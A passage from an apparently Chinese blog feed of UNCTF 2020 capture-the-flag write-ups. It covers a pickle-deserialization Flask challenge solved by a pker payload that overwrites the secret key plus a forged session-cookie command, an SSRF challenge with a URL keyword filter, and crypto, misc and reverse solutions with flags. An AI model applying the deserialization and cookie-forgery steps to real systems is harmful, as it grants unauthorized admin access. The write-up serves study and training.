getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag = <span class="string">"xxx"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    app.config[<span class="string">"SECRET_KEY"</span>] = config.secret_key</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"login"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/login",methods=["GET","POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">'name'</span>):</span><br><span class="line">        name = request.form.get(<span class="string">'name'</span>)</span><br><span class="line">        person = Person(name,<span class="number">0</span>)</span><br><span class="line">        pkl = pickle.dumps(person)</span><br><span class="line">        pkl = base64.b64encode(pkl)</span><br><span class="line"></span><br><span class="line">        resp = make_response(name)</span><br><span class="line">        resp.set_cookie(<span class="string">'pkl'</span>,pkl)</span><br><span class="line"></span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">        session[<span class="string">'is_admin'</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'name'</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span>   base64.b64decode(request.cookies[<span class="string">'pkl'</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"RCE??"</span></span><br><span class="line">            person = pickle.loads(base64.b64decode(request.cookies[<span class="string">'pkl'</span>]))</span><br><span class="line">            print(person.is_admin)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">'is_admin'</span>) == <span class="number">1</span>:</span><br><span class="line">                <span class="comment">#person = pickle.loads(base64.b64decode(request.cookies['pkl']))</span></span><br><span class="line">                <span class="keyword">if</span> person.is_admin == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"HHHacker!Here is Your flag : "</span> + flag</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>,name=session.get(<span class="string">'name'</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/logout",methods=["GET","POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(<span class="string">"success"</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">"session"</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">"pkl"</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/source")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">'code.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>赛后复现了一下，考点是 pickle 反序列化覆盖 secret_key 以及 flask cookie 伪造</p><p>pickle 反序列化可以参考以下几篇文章：</p><p><a href="https://xz.aliyun.com/t/7436" target="_blank" rel="noopener">https://xz.aliyun.com/t/7436</a></p><p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a></p><p><a href="https://www.smi1e.top/%E4%BB%8Ebalsn-ctf-pyshv%E5%AD%A6%E4%B9%A0python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">https://www.smi1e.top/%E4%BB%8Ebalsn-ctf-pyshv%E5%AD%A6%E4%B9%A0python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></p><p>手搓字节码关键在于理解 opcode 作用，不太理解的可以尝试阅读源代码帮助理解，以及理清栈和 memo 里每一步的数据。可以使用 pker 帮助构建，建议可以在本地测试 opcode 是否构建正确</p><p>pker 代码，覆盖 secret_key ，返回 Person 对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">secret = GLOBAL(<span class="string">'__main__'</span>, <span class="string">'config'</span>)</span><br><span class="line">secret.secret_key = <span class="string">'hello'</span></span><br><span class="line">person = INST(<span class="string">'__main__'</span>, <span class="string">'Person'</span>, <span class="string">'admin'</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> person</span><br></pre></td></tr></table></figure><p>然后使用 flask-session-cookie-manager 伪造 cookie，注意这里的参数都需要用双引号扩起来，github 文档示例不太对，会报错</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py <span class="number">-3</span> flask_session_cookie_manager3.py encode -s <span class="string">"hello"</span> -t <span class="string">"&#123;'</span>name':<span class="string">'admin'</span>,<span class="string">'is_admin'</span>:<span class="number">1</span>&#125;<span class="string">"</span></span><br></pre></td></tr></table></figure><p>具体流程，登录过后，修改 <code>coookie</code> 的 pkl，访问 <code>/login</code> 反序列化覆盖 <code>secret_key</code> ，然后再访问 <code>/</code> 覆盖掉 <code>app.config[&quot;SECRET_KEY&quot;]</code>，接着更改 <code>cookie</code> 的 <code>session</code> 为篡改的 session 访问 <code>/login</code> 即可获得 flag</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h3><p>010 editor 打开发现最后有个 b 站地址，访问后第一条评论就是 flag</p><p><a href="https://www.bilibili.com/video/BV1y44111737" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1y44111737</a></p><h3 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h3><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.</span><br><span class="line">就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这.</span><br><span class="line">就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.</span><br><span class="line">就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 不会吧! 就这. 就这. 就这.</span><br><span class="line">就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这.</span><br><span class="line">就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧!</span><br><span class="line">不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这. 就这.</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>三个密码子，最先猜测摩斯密码肯定不对，后来又尝试了其他很多密码，最后想到 Ook 编码三个密码子，且对应后缀 <code>.</code>、<code>?</code> 、<code>!</code> 然后解密即可</p><h3 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h3><p>游戏还是很好玩，按照游戏流程过游戏，然后修改 rpgsave 存档文件，修改金钱数即可购买 flag</p><h3 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h3><p>ylb 的验证码给搬上来了，正确输入 10 次即可获得 flag，不得不吐槽，眼睛都快瞎了</p><h3 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h3><p>把图移开后发现 base64 后的 flag</p><h3 id="YLB绝密文件"><a href="#YLB绝密文件" class="headerlink" title="YLB绝密文件"></a>YLB绝密文件</h3><p>流量包获取到三个文件 <code>xor.py</code>，<code>YLBSB.xor</code>，<code>secret.pyc</code></p><p>pyc 反编译的到 <code>key</code> ，然后编写脚本跑就完事，3M的文件，跑了一个小时。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@time:2020/11/09 19:44:44</span></span><br><span class="line"><span class="string">@author:Str3am</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">'YLBSB?YLBNB!'</span></span><br><span class="line">enc = open(<span class="string">"YLBSB.xor"</span>, <span class="string">"rb"</span>)</span><br><span class="line">file = open(<span class="string">"YLBSB.docx"</span>, <span class="string">"wb"</span>)</span><br><span class="line">ciper = enc.read()</span><br><span class="line">file_base64 = <span class="string">b''</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciper:</span><br><span class="line">    m = c^ord(key[count % len(key)])</span><br><span class="line">    file_base64 = file_base64+chr(m).encode()</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">    <span class="comment"># if count == 8:</span></span><br><span class="line">    <span class="comment">#     break</span></span><br><span class="line">file.write(base64.b64decode(file_base64))</span><br></pre></td></tr></table></figure><h3 id="mouse-click"><a href="#mouse-click" class="headerlink" title="mouse_click"></a>mouse_click</h3><p>流量分析，usb协议，参照这篇文章，提取出坐标点，然后plot绘图即可得flag的镜像</p><p><a href="https://blog.csdn.net/qq_43625917/article/details/107723635" target="_blank" rel="noopener">https://blog.csdn.net/qq_43625917/article/details/107723635</a></p><p><code>unctf{U5BC@P}</code></p><h3 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h3><p>补齐定位点扫描即得</p><p><code>unctf{QR@2yB0x}</code></p><h3 id="零"><a href="#零" class="headerlink" title="零"></a>零</h3><p>零宽度字符，解密即得 <code>unctf{sycj24_6hvgj_8gfj}</code></p><h3 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h3><p>john直接破解密码为 <code>123456</code></p><h3 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h3><p>010 editor直接读</p><h3 id="网络深处"><a href="#网络深处" class="headerlink" title="网络深处"></a>网络深处</h3><p>解码工具分析出拨号内容，解压后发现塔珀自指公式，参考这篇文章解出</p><p><a href="https://www.cnblogs.com/l137/p/3594664.html" target="_blank" rel="noopener">https://www.cnblogs.com/l137/p/3594664.html</a></p><p><code>flag{Y29pbA==}</code></p><h3 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ_IMAGE"></a>EZ_IMAGE</h3><p>参考文章，montage + gaps拼图</p><p><a href="https://shawroot.cc/archives/639" target="_blank" rel="noopener">https://shawroot.cc/archives/639</a></p><p><img src="/2020/11/19/Web_17/20201114003722.png" alt="image-20201114003717337"></p><p><code>UNCTF{EZ_MISC_AND_HACK_FUN}</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h3><p>直接一直回车，然后出了部分 flag <code>UNCTF{Gu@rd_Th3_Bes7_</code>，结合题目名字，<code>UNCTF{Gu@rd_Th3_Bes7_YLB}</code>，没有pwn环境，有空学一学，应该就是一直请求接收包就可以。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">q = number.getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> p &gt; q:</span><br><span class="line">    a = p + q</span><br><span class="line">    b = p - q</span><br><span class="line">    print(a,b)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = bytes_to_long(<span class="string">b'msg'</span>)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168</span></span><br><span class="line"><span class="comment">#9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370</span></span><br><span class="line"><span class="comment">#22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br></pre></td></tr></table></figure><p>a，b已知，通过加减乘除即可知 p，q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@time:2020/11/07 23:56:39</span></span><br><span class="line"><span class="string">@author:Str3am</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, isPrime</span><br><span class="line"></span><br><span class="line">a = <span class="number">320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168</span></span><br><span class="line">b = <span class="number">9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370</span></span><br><span class="line">c = <span class="number">22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br><span class="line"></span><br><span class="line">q = (a-b)//<span class="number">2</span></span><br><span class="line">p = a - q</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment"># UNCTF&#123;welcome_to_rsa&#125;</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是，如果是 <code>q = (a-b)/2</code> ，会抛出 <code>OverflowError: int too large to convert to float</code>。这里是因为在 Python3 里面，<code>/</code> 默认是浮点数除法，q 默认类型即为 <code>float</code> ，浮点数对于大数会出现掉精度的问题，导致相减时范围溢出。</p><p>解决方法是换用整数除法 <code>\\</code>，整数除法在 Python3 里面是结果向下取整，如下，但重要的是做大数除法的时候会保留 int 类型的精度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">9</span>/<span class="number">2</span></span><br><span class="line"><span class="number">4.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">9</span>//<span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h3><p>winner attack 获取到 d 的值，然后解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@time:2020/11/09 17:18:05</span></span><br><span class="line"><span class="string">@author:Str3am</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n= <span class="number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span></span><br><span class="line">c= <span class="number">140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934</span></span><br><span class="line">d= <span class="number">74651354506339782898861455541319178061583554604980363549301373281141419821253</span></span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto</span></span><br></pre></td></tr></table></figure><p>培根密码，o换成a，t换成b，然后解密即可，<code>unctf{PEIGENHENYOUYINGYANG}</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="re-checkin"><a href="#re-checkin" class="headerlink" title="re_checkin"></a>re_checkin</h3><p><img src="/2020/11/19/Web_17/20201111140507.png" alt="image-20201111140459406"></p><p>初入逆向，工具都是现学，x64dbg 动态调即得 flag</p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>参照这篇文章，反编译 run.py</p><p><a href="http://pluie.top/2020/09/03/pyinstaller%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E5%8F%8D%E6%B1%87%E7%BC%96%E6%88%90-py%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">http://pluie.top/2020/09/03/pyinstaller%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E5%8F%8D%E6%B1%87%E7%BC%96%E6%88%90-py%E6%96%87%E4%BB%B6/</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="string">'UMAQBvogWLDTWgX"""k'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    flag += chr(ord(str2[i]) + i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(flag)</span></span></span><br></pre></td></tr></table></figure><p><code>UNCTF{un_UN_ctf123}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;easy-ssrf&quot;&gt;&lt;a href=&quot;#easy-ssrf&quot; class=&quot;headerlink&quot; title=&quot;easy_ssrf&quot;&gt;&lt;/a&gt;easy_ssrf&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;welc0me to 2020UNCTF!!&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$url = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/unctf\.com/&#39;&lt;/span&gt;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/php|file|zip|bzip|zlib|base|data/i&#39;&lt;/span&gt;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $url=file_get_contents($url);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;($url);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;error!!&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;url里只要包含 &lt;code&gt;unctf.com&lt;/code&gt; 即可，开始想多了，弄到 gopher 协议了，然后发现 &lt;code&gt;dict&lt;/code&gt; 和 &lt;code&gt;gopher&lt;/code&gt; 协议根本没开启，手慢错失三血&lt;/p&gt;
